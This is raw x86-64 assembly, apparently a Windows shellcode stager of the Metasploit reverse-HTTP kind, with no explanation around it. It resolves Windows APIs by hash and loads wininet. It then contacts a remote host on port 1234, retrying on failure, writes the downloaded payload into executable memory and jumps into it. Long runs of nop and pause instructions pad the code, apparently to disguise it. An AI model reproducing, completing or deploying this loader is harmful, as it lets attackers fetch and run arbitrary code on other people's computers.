```asm
_start:
    cld
    pause
    and rsp, 0xfffffffffffffff0
    nop
    call L_d6
RET_a:
    push r9
    push r8
    push rdx
    mov rdx, rdx
    xor rdx, rdx
    push rcx
    nop
    mov rdx, qword ptr gs:[rdx + 0x60]
    push rsi
    mov rdx, qword ptr [rdx + 0x18]
    lea rdx, [rdx + 0]
    mov rdx, qword ptr [rdx + 0x20]
L_21:
    mov rsi, qword ptr [rdx + 0x50]
    movzx rcx, word ptr [rdx + 0x4a]
    xor r9, r9
    nop
L_2d:
    xor rax, rax
    lodsb al, byte ptr [rsi]
    cmp al, 0x61
    jl L_37
    sub al, 0x20
L_37:
    ror r9d, 0xd
    add r9d, eax
    loop L_2d
    pause
    push rdx
    nop
    mov rdx, qword ptr [rdx + 0x20]
    mov eax, dword ptr [rdx + 0x3c]
    push r9
    add rax, rdx
    cmp word ptr [rax + 0x18], 0x20b
    jne L_cb
    nop
    mov eax, dword ptr [rax + 0x88]
    test rax, rax
    je L_cb
    mov rax, rax
    add rax, rdx
    push rax
    mov r8d, dword ptr [rax + 0x20]
    add r8, rdx
    mov ecx, dword ptr [rax + 0x18]
L_72:
    jrcxz L_ca
    dec rcx
    mov esi, dword ptr [r8 + rcx*4]
    xor r9, r9
    add rsi, rdx
L_81:
    xor rax, rax
    lodsb al, byte ptr [rsi]
    ror r9d, 0xd
    add r9d, eax
    cmp al, ah
    jne L_81
    add r9, qword ptr [rsp + 8]
    cmp r9d, r10d
    jne L_72
    pop rax
    mov r8d, dword ptr [rax + 0x24]
    add r8, rdx
    mov cx, word ptr [r8 + rcx*2]
    mov r8d, dword ptr [rax + 0x1c]
    add r8, rdx
    mov eax, dword ptr [r8 + rcx*4]
    pop r8
    pop r8
    add rax, rdx
    pop rsi
    pop rcx
    pop rdx
    pop r8
    pop r9
    pop r10
    sub rsp, 0x20
    push r10
    jmp rax
L_ca:
    pop rax
    pause
L_cb:
    pop r9
    pop rdx
    nop
    mov rdx, qword ptr [rdx]
    jmp L_21
L_d6:
    pop rbp
    pause
    xor rbx, rbx
    push rbx
    movabs r14, 0x74656e696e6977
    push r14
    mov rcx, rsp
    nop
    mov r10, 0x726774c
    call rbp
    push rbx
    push rbx
    lea rcx, [rip + DATA_0]
    pause
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    push rbx
    pop rdx
    xor r8, r8
    xor r9, r9
    push rbx
    push rbx
    movabs r10, 0xa779563a
    call rbp
    lea rdx, [rip + DATA_1]
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    mov rcx, rax
    mov r8, 0x4d2
    pause
    xor r9, r9
    push rbx
    push rbx
    push 3
    push rbx
    movabs r10, 0xc69f8957
    call rbp
    jmp DATA_STUB_2
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
L_242:
    mov rcx, rax
    nop
    push rbx
    pop rdx
    pop r8
    xor r9, r9
    push rbx
    movabs rax, 0x84280200
    push rax
    push rbx
    push rbx
    mov r10, 0x3b2e55eb
    call rbp
    mov rsi, rax
    push 0xa
    pop rdi
L_269:
    push rbx
    pop rdx
    mov rcx, rsi
    xor r9, r9
    xor r9, r9
    push rbx
    push rbx
    mov r10, 0x7b18062d
    call rbp
    test eax, eax
    jne L_2a2
    mov rcx, 0x1388
    movabs r10, 0xe035f044
    call rbp
    dec rdi
    je L_29d
    jmp L_269
L_29d:
    call L_2f7
L_2a2:
RET_2a2:
    push rbx
    nop
    pop rcx
    push 0x40
    pop rdx
    mov r9, rdx
    shl edx, 0x10
    mov r8, 0x1000
    movabs r10, 0xe553a458
    call rbp
    xchg rbx, rax
    push rbx
    push rbx
    mov rdi, rsp
L_2c7:
    mov rcx, rsi
    mov rdx, rbx
    mov r8, 0x2000
    mov r9, rdi
    movabs r10, 0xe2899612
    call rbp
    add rsp, 0x20
    test eax, eax
    je L_29d
    mov ax, word ptr [rdi]
    add rbx, rax
    test eax, eax
    jne L_2c7
    pop rax
    ret
L_2f7:
    pop rax
    nop
    push 0
    pop rcx
    mov r10, 0x56a2b5f0
    call rbp
```